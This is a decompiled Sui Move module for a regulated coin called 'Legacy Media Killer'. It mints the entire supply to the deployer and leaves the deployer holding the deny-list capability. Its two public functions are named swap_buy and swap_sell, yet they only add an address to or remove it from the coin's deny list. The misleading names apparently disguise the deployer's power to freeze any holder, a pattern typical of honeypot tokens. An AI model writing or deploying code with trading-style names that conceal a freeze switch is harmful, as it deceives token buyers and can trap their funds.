module 0x40f5ea7abcf214e0116ac8dcc2c7b252cc4716fdad598d8bc273684b1365b74::x {
    struct X has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: X, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<X>(arg0, 9, b"X", b"Legacy Media Killer", x"f09d958f20697320746865204c6567616379204d65646961204b696c6c65722e20467265652053706565636820506c6174666f726d202d20506f77657220746f207468652070656f706c6521", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://node1.irys.xyz/P5WyON0I7WRvxEZaRWYJtEf3m6fQiUujcxMHvNo3RWc"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<X>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<X>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<X>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<X>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<X>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<X>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<X>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<X>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

